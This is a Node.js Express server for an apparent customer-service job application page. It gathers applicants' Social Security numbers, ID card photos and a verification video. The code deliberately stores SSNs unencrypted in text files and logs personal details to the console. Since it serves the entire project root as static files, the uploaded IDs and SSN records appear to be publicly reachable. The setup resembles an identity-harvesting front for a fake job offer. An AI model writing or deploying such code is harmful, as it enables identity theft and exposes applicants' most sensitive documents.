const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 8000;

// Ensure uploads directory exists
const uploadsDir = path.join(__dirname, 'backend', 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Static files - serve everything from root
app.use(express.static(__dirname));

// File upload configuration
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    // Create folder based on applicant's name from form data
    let folderName = 'temp';
    
    // Try to get names from form data
    if (req.body && req.body.firstName && req.body.lastName) {
      const fullName = `${req.body.firstName} ${req.body.lastName}`;
      const safeFolderName = fullName
        .replace(/[^a-zA-Z0-9\s]/g, '') // Remove special characters
        .replace(/\s+/g, '-') // Replace spaces with hyphens
        .toLowerCase();
      
      const timestamp = new Date().toISOString().slice(0, 10); // YYYY-MM-DD
      folderName = `${timestamp}_${safeFolderName}`;
    } else {
      folderName = `temp_${Date.now()}`;
    }
    
    const applicantDir = path.join(uploadsDir, folderName);
    
    if (!fs.existsSync(applicantDir)) {
      fs.mkdirSync(applicantDir, { recursive: true });
    }
    
    // Store folder name for later use
    req.applicantFolder = folderName;
    
    cb(null, applicantDir);
  },
  filename: (req, file, cb) => {
    // Simple, clear filenames based on field
    let filename;
    switch (file.fieldname) {
      case 'idFront':
        filename = `front-id${path.extname(file.originalname)}`;
        break;
      case 'idBack':
        filename = `back-id${path.extname(file.originalname)}`;
        break;
      case 'video':
        filename = `verification-video${path.extname(file.originalname)}`;
        break;
      default:
        filename = `${file.fieldname}${path.extname(file.originalname)}`;
    }
    cb(null, filename);
  }
});

const upload = multer({ 
  storage,
  limits: {
    fileSize: 10 * 1024 * 1024 // 10MB limit
  },
  fileFilter: (req, file, cb) => {
    // Allow images for ID uploads and video for verification
    const imageTypes = /jpeg|jpg|png|gif|webp/;
    const videoTypes = /mp4|webm|mov/;
    const extname = path.extname(file.originalname).toLowerCase();
    
    if (file.fieldname === 'video') {
      const isValidVideo = videoTypes.test(extname.substring(1)) || file.mimetype.startsWith('video/');
      if (isValidVideo) {
        return cb(null, true);
      } else {
        return cb(new Error('Only MP4, WebM, and MOV video files are allowed'));
      }
    } else {
      // For ID uploads (idFront, idBack)
      const isValidImage = imageTypes.test(extname.substring(1)) || file.mimetype.startsWith('image/');
      if (isValidImage) {
        return cb(null, true);
      } else {
        return cb(new Error('Only image files are allowed for ID uploads'));
      }
    }
  }
});

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/health', (req, res) => {
  try {
    // Check if uploads directory exists and is writable
    const uploadsCheck = fs.existsSync(uploadsDir);
    
    res.json({ 
      status: 'OK', 
      timestamp: new Date().toISOString(),
      environment: process.env.NODE_ENV || 'development',
      port: PORT,
      uploadsDir: uploadsCheck ? 'Ready' : 'Creating...',
      uptime: process.uptime()
    });
  } catch (error) {
    console.error('Health check failed:', error);
    res.status(500).json({
      status: 'ERROR',
      message: 'Health check failed',
      error: error.message
    });
  }
});

// Middleware to create applicant folder after multer parses form data
const createApplicantFolder = (req, res, next) => {
  // This will run after multer, so req.body should be available
  next();
};

// Application submission endpoint
app.post('/api/submit-application', upload.fields([
  { name: 'idFront', maxCount: 1 },
  { name: 'idBack', maxCount: 1 },
  { name: 'video', maxCount: 1 }
]), (req, res) => {
  try {
    const { name, email, phone, firstName, lastName, experience, schedule, location, ssn } = req.body;
    const files = req.files;
    const applicantFolder = req.applicantFolder;
    
    // Create application info text file
    const applicationInfo = {
      timestamp: new Date().toISOString(),
      applicantName: `${firstName} ${lastName}`,
      email: email,
      phone: phone,
      location: location,
      experience: experience,
      schedule: schedule,
      ssn: ssn || 'Not provided', // Store SSN unencrypted as requested
      applicationId: 'APP-' + Date.now(),
      filesUploaded: {
        idFront: files && files.idFront ? 'Yes' : 'No',
        idBack: files && files.idBack ? 'Yes' : 'No',
        video: files && files.video ? 'Yes' : 'No'
      }
    };
    
    // Save application info to text file
    const infoFilePath = path.join(uploadsDir, applicantFolder, 'application-info.txt');
    const infoText = `CUSTOMER SERVICE APPLICATION
========================================

Applicant Information:
- Full Name: ${applicationInfo.applicantName}
- Email: ${applicationInfo.email}
- Phone: ${applicationInfo.phone}
- Location: ${applicationInfo.location}
- Experience Level: ${applicationInfo.experience}
- Preferred Schedule: ${applicationInfo.schedule}
- SSN: ${applicationInfo.ssn}

Application Details:
- Application ID: ${applicationInfo.applicationId}
- Submission Date: ${applicationInfo.timestamp}
- Folder: ${applicantFolder}

Files Uploaded:
- Front ID: ${applicationInfo.filesUploaded.idFront}
- Back ID: ${applicationInfo.filesUploaded.idBack}
- Verification Video: ${applicationInfo.filesUploaded.video}

Status: Pending Review
========================================`;

    fs.writeFileSync(infoFilePath, infoText);
    
    console.log('=== New Application Received ===');
    console.log('Applicant:', applicationInfo.applicantName);
    console.log('Folder Created:', applicantFolder);
    console.log('Email:', email);
    console.log('Phone:', phone);
    console.log('Files uploaded:');
    if (files) {
      if (files.idFront) console.log('- ID Front: front-id' + path.extname(files.idFront[0].originalname));
      if (files.idBack) console.log('- ID Back: back-id' + path.extname(files.idBack[0].originalname));
      if (files.video) console.log('- Video: verification-video' + path.extname(files.video[0].originalname));
    }
    console.log('Info saved to:', infoFilePath);
    console.log('================================');
    
    // Simulate processing time
    setTimeout(() => {
      res.json({ 
        success: true, 
        message: 'Application submitted successfully! We will contact you within 24 hours.',
        applicationId: applicationInfo.applicationId,
        applicantFolder: applicantFolder,
        nextSteps: [
          'Check your email for confirmation',
          'Prepare for a brief phone screening',
          'Review job details and requirements'
        ]
      });
    }, 1500);
    
  } catch (error) {
    console.error('Application submission error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'There was an error processing your application. Please try again.' 
    });
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  if (error instanceof multer.MulterError) {
    if (error.code === 'LIMIT_FILE_SIZE') {
      return res.status(400).json({
        success: false,
        message: 'File too large. Please upload files smaller than 10MB.'
      });
    }
    if (error.code === 'MISSING_FIELD_NAME') {
      return res.status(400).json({
        success: false,
        message: 'Invalid file upload. Please ensure all required files are properly selected.'
      });
    }
  }
  
  console.error('Server error:', error);
  res.status(500).json({
    success: false,
    message: 'Internal server error. Please try again later.'
  });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Customer Service Landing Page Server running on port ${PORT}`);
  console.log(`📍 Local URL: http://localhost:${PORT}`);
  console.log(`📁 Serving static files from: ${__dirname}`);
  console.log(`📤 Upload directory: ${uploadsDir}`);
  console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🔧 Railway Deploy: ${process.env.RAILWAY_ENVIRONMENT_NAME || 'local'}`);
  
  // Ensure uploads directory exists with proper permissions
  try {
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir, { recursive: true });
      console.log(`✅ Created uploads directory: ${uploadsDir}`);
    }
    console.log(`✅ Server startup complete - Ready to accept connections`);
  } catch (error) {
    console.error(`❌ Error setting up uploads directory:`, error);
  }
}); 